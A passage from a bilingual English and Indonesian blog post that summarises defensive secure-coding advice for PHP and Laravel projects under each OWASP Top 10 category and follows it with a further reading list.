- [ ] GitHub Actions atau workflow CI/CD lainnya mem-pin actions ke SHA commit lengkap
- [ ] Secrets diinjeksi melalui environment atau secrets manager — tidak pernah di file workflow
- [ ] Deployment production menggunakan `composer install --no-dev --optimize-autoloader`
- [ ] Tes otomatis menyertakan security regression tests untuk alur kritis (auth, otorisasi, akses data)

</section>

---

<section lang="en">

## Summary

1. **Security is not optional.** Every student project that processes user data—fintech payments, healthcare records, academic credentials—is a potential breach target. The OWASP Top 10 is your minimum viable security baseline.
2. **Shift left.** Fix vulnerabilities during requirements and design, not during penetration testing. A design-level fix costs 30× less than a production hotfix. Apply STRIDE threat modelling before writing a single line of code.
3. **A01—Broken Access Control** is the most common vulnerability. Always verify that the authenticated user owns or has permission to access the requested resource. Never rely on client-side UI to enforce authorisation.
4. **A02—Cryptographic Failures** are trivially avoidable. Use `password_hash()` with bcrypt (cost >= 12). Never use MD5 or SHA1. Never hardcode secrets—use environment variables.
5. **A03—Injection** is stopped by prepared statements (SQL), output escaping (XSS), and input allowlists (command). If you only fix one category in your codebase today, make it this one.
6. **A04—Insecure Design** means missing controls: no rate limiting, no audit logs, trust-by-default assumptions. Design for zero-trust—validate, authenticate, and authorise every request.
7. **A05—Security Misconfiguration** is "death by a thousand paper cuts." Turn off debug mode, restrict CORS origins, set security headers, and protect your `.env` file.
8. **A06—Vulnerable and Outdated Components** are the easiest risk to fix: run `composer audit` regularly, enable Dependabot, and stay on supported PHP and Laravel versions.
9. **A07—Authentication Failures** are prevented with strong password policies, session regeneration after login, `HttpOnly`/`Secure`/`SameSite` cookies, and MFA for sensitive accounts.
10. **A08—Software Integrity Failures** mean verifying that your code, dependencies, and deployment artifacts have not been tampered with. Pin actions, verify hashes, sign artifacts.
11. **A09—Logging and Monitoring** is your breach detection system. Log authentication events, authorisation failures, and suspicious patterns. Never log raw passwords or PII. Set up automated alerts.
12. **A10—SSRF** is prevented with URL allowlists, internal IP blocks, scheme restrictions (`HTTPS` only), and redirect validation. Never accept arbitrary URLs from users.

> "Given enough eyeballs, all bugs are shallow—but only if those eyeballs are trained to recognise them. Every developer is a security engineer. Wear that responsibility in every pull request."

## What to Read Next

- **[Software Engineering for Fintech: Secure Payment Flow with PHP](/blog/software-engineering-for-fintech-payment-flow-php)** — Apply secure coding to payment systems: idempotency keys, double-entry ledgers, PCI-DSS considerations, and fraud detection guards.
- **[Software Engineering for Healthcare: Patient Registration with PHP](/blog/se-engineering-for-healthcare-patient-registration-php)** — Domain-specific security for healthcare systems: HIPAA-inspired data protection, audit trails, and consent management.
- **[Code Quality Analysis with PHP](/blog/code-quality-analysis-php)** — Automate security checks with PHPStan, PHP_CodeSniffer security rules, and PHPMD. Catch injection and configuration issues before code review.
- **[LLM-Assisted Coding with PHP: From Prompts to Production](/blog/llm-assisted-coding-php)** — Learn the security risks of AI-generated code: prompt injection, hallucinated APIs, and how to use LLMs safely in your development workflow.
- **[Clean Code Principles with PHP](/blog/clean-code-principles)** — Write code that is both secure and maintainable. Clean code makes security vulnerabilities easier to spot during review.
- **[Test-Driven Development with PHP](/blog/test-driven-development)** — Write security regression tests first. Ensure that SQL injection, XSS, and access control bugs never return.
- **[Blackbox and Whitebox Test](/blog/blackbox-and-whitebox-test)** — Build a security testing strategy that combines penetration testing (blackbox) with static analysis (whitebox).
- **[OWASP Top 10 (2021) — Official Documentation](https://owasp.org/www-project-top-ten/)** — The definitive reference. Bookmark this and review it before every major release.
- **[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)** — Practical, language-specific security guidance. The PHP and Laravel cheat sheets are especially useful.
- **[Laravel Security Best Practices](https://laravel.com/docs/security)** — Official Laravel documentation on authentication, authorisation, encryption, and CSRF protection.

</section>

<section lang="id">

## Ringkasan

1. **Keamanan tidak opsional.** Setiap proyek mahasiswa yang memproses data pengguna—pembayaran fintech, catatan kesehatan, kredensial akademik—adalah target pelanggaran potensial. OWASP Top 10 adalah baseline keamanan minimum yang layak.
2. **Geser ke kiri.** Perbaiki kerentanan selama requirements dan desain, bukan selama pengujian penetrasi. Perbaikan tingkat desain biayanya 30× lebih murah daripada hotfix production. Terapkan threat modelling STRIDE sebelum menulis satu baris kode pun.
3. **A01—Broken Access Control** adalah kerentanan paling umum. Selalu verifikasi bahwa pengguna terautentikasi memiliki atau diizinkan mengakses resource yang diminta. Jangan pernah mengandalkan UI sisi klien untuk menegakkan otorisasi.
4. **A02—Kegagalan Kriptografi** dapat dihindari dengan mudah. Gunakan `password_hash()` dengan bcrypt (cost >= 12). Jangan pernah menggunakan MD5 atau SHA1. Jangan pernah hardcode secrets—gunakan variabel environment.
5. **A03—Injeksi** dihentikan oleh prepared statements (SQL), output escaping (XSS), dan allowlist input (command). Jika Anda hanya memperbaiki satu kategori di codebase Anda hari ini, jadikan yang ini.
6. **A04—Desain Tidak Aman** berarti kontrol yang hilang: tidak ada rate limiting, tidak ada log audit, asumsi trust-by-default. Desain untuk zero-trust—validasi, autentikasi, dan otorisasi setiap permintaan.
7. **A05—Miskonfigurasi Keamanan** adalah "kematian oleh seribu luka kertas." Matikan mode debug, batasi origin CORS, atur header keamanan, dan lindungi file `.env` Anda.
8. **A06—Komponen Rentan dan Usang** adalah risiko termudah untuk diperbaiki: jalankan `composer audit` secara teratur, aktifkan Dependabot, dan tetap di versi PHP dan Laravel yang didukung.
9. **A07—Kegagalan Autentikasi** dicegah dengan kebijakan password kuat, regenerasi sesi setelah login, cookie `HttpOnly`/`Secure`/`SameSite`, dan MFA untuk akun sensitif.
10. **A08—Kegagalan Integritas Perangkat Lunak** berarti memverifikasi bahwa kode, dependensi, dan artifact deployment Anda tidak telah dirusak. Pin actions, verifikasi hash, tandatangani artifact.
11. **A09—Pencatatan dan Pemantauan** adalah sistem deteksi pelanggaran Anda. Catat peristiwa autentikasi, kegagalan otorisasi, dan pola mencurigakan. Jangan pernah mencatat password mentah atau PII. Atur peringatan otomatis.
12. **A10—SSRF** dicegah dengan allowlist URL, blok IP internal, pembatasan skema (hanya `HTTPS`), dan validasi redirect. Jangan pernah menerima URL arbitrer dari pengguna.

> "Dengan cukup banyak mata, semua bug dangkal—tetapi hanya jika mata-mata itu terlatih untuk mengenalinya. Setiap pengembang adalah security engineer. Kenakan tanggung jawab itu di setiap pull request."

## Bacaan Selanjutnya

- **[Rekayasa Perangkat Lunak untuk Fintech: Alur Pembayaran Aman dengan PHP](/blog/software-engineering-for-fintech-payment-flow-php)** — Terapkan secure coding ke sistem pembayaran: kunci idempotensi, buku besar double-entry, pertimbangan PCI-DSS, dan penjaga deteksi penipuan.
- **[Rekayasa Perangkat Lunak untuk Kesehatan: Pendaftaran Pasien dengan PHP](/blog/se-engineering-for-healthcare-patient-registration-php)** — Keamanan spesifik domain untuk sistem kesehatan: perlindungan data terinspirasi HIPAA, jejak audit, dan manajemen persetujuan.
- **[Analisis Kualitas Kode dengan PHP](/blog/code-quality-analysis-php)** — Otomatiskan pemeriksaan keamanan dengan PHPStan, aturan keamanan PHP_CodeSniffer, dan PHPMD. Tangkap masalah injeksi dan konfigurasi sebelum code review.
- **[Coding Berbantuan LLM dengan PHP: Dari Prompt ke Produksi](/blog/llm-assisted-coding-php)** — Pelajari risiko keamanan kode yang dihasilkan AI: prompt injection, API halusinasi, dan cara menggunakan LLM dengan aman dalam alur kerja pengembangan Anda.
- **[Prinsip Clean Code dengan PHP](/blog/clean-code-principles)** — Tulis kode yang aman dan mudah dipelihara. Clean code membuat kerentanan keamanan lebih mudah dikenali selama review.
- **[Test-Driven Development dengan PHP](/blog/test-driven-development)** — Tulis security regression tests terlebih dahulu. Pastikan bahwa bug SQL injection, XSS, dan kontrol akses tidak pernah kembali.
- **[Blackbox dan Whitebox Test](/blog/blackbox-and-whitebox-test)** — Bangun strategi pengujian keamanan yang menggabungkan pengujian penetrasi (blackbox) dengan analisis statis (whitebox).
- **[OWASP Top 10 (2021) — Dokumentasi Resmi](https://owasp.org/www-project-top-ten/)** — Referensi definitif. Tandai ini dan tinjau sebelum setiap rilis besar.
- **[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)** — Panduan keamanan praktis spesifik bahasa. Cheat sheet PHP dan Laravel sangat berguna.
- **[Praktik Terbaik Keamanan Laravel](https://laravel.com/docs/security)** — Dokumentasi resmi Laravel tentang autentikasi, otorisasi, enkripsi, dan perlindungan CSRF.

</section>
